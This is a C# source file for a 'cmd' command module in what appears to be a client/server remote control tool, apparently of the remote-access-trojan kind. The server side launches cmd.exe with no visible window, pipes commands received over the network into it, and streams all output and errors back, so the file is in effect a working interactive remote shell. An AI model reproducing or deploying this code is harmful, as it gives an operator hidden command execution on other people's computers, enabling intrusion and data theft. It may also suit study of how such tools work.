using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Commands
{
    internal class Cmd : ICommand
    {
        public string name { get; } = "cmd";

        public string description { get; } = "Opens a Windows command prompt to interact with, use 'exit' to exit the cmd prompt and return";

        public string syntaxHelper { get; } = "cmd";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = null;


        public bool PreProcessCommand(List<string> args)
        {
            throw new NotImplementedException();
        }

        public void ClientMethod(List<string> args)
        {
            var ts = new CancellationTokenSource();
            var cancelToken = ts.Token;
            Task.Factory.StartNew(() =>
            {
                while (true)
                {
                    var receivedData = CommandsManager.networkManager.ReadLine();

                    // Main thread exited and notified this task to stop
                    if (cancelToken.IsCancellationRequested)
                    {
                        break;
                    }

                    // Normal output (text)
                    // Check if the line isn't the one representing the path in the cmd
                    if (receivedData.Length > 0 && !(receivedData[receivedData.Length - 1] == '>' && receivedData.Contains(@":\")))
                    {
                        // Add line return
                        Console.WriteLine(receivedData);
                    }
                    else
                    {
                        // Display cmd path without line return
                        Console.Write(receivedData);
                    }
                }
            }, cancelToken);


            while (true)
            {
                var userInput = Console.ReadLine();

                if (userInput == "cls" || userInput == "clear")
                {
                    userInput = "";
                    Console.Clear();
                }

                CommandsManager.networkManager.WriteLine(userInput);
                if (userInput == "exit")
                {
                    // Cancel the listening task
                    ts.Cancel();
                    break;
                }
            }
        }


        public void ServerMethod(List<string> args)
        {
            var processCmd = new Process
            {
                StartInfo =
                {
                    FileName = "cmd.exe",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    StandardOutputEncoding = Encoding.GetEncoding(850),
                    StandardErrorEncoding = Encoding.GetEncoding(850),
                    RedirectStandardOutput = true,
                    RedirectStandardInput = true,
                    RedirectStandardError = true
                },
            };
            processCmd.OutputDataReceived += CmdOutputDataHandler;
            processCmd.ErrorDataReceived += CmdErrorDataHandler;
            processCmd.Start();
            processCmd.BeginOutputReadLine();
            processCmd.BeginErrorReadLine();

            // Send input to display the cmd prompt path
            processCmd.StandardInput.WriteLine("echo %cd%>\n");

            while (true)
            {
                var userInput = CommandsManager.networkManager.ReadLine();


                if (userInput == "exit")
                {
                    processCmd.Kill();
                    break;
                }

                if (userInput == "")
                {
                    // If nothing is wrote, there will be a problem with the output processing (2 times just the path), this is a workaround
                    userInput = "echo %cd%>";
                }

                // Read next line from network stream reader and send it to the cmd
                processCmd.StandardInput.WriteLine($"{userInput}\n");
            }
        }


        /// <summary>
        /// Send output to client
        /// </summary>
        /// <param name="sendingProcess"></param>
        /// <param name="e"></param>
        void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs e)
        {
            var output = e.Data;
            if (string.IsNullOrEmpty(e.Data)) return;

            try
            {
                // Check if the line is the one representing the path
                if (output.Substring(1, 2) == ":\\" && output.Contains(">"))
                {
                    // Represents path + > + command
                    if (output[output.Length - 1] != '>')
                    {
                        return;
                    }

                    // Change current working directory to the path and return
                    Directory.SetCurrentDirectory(output.Substring(0, output.Length - 1));
                }

                CommandsManager.networkManager.WriteLine(output);
            }
            catch (Exception)
            {
                // ignored
            }
        }

        /// <summary>
        /// Send error output to client
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        void CmdErrorDataHandler(object sender, DataReceivedEventArgs e)
        {
            CommandsManager.networkManager.WriteLine(e.Data);
        }
    }
}
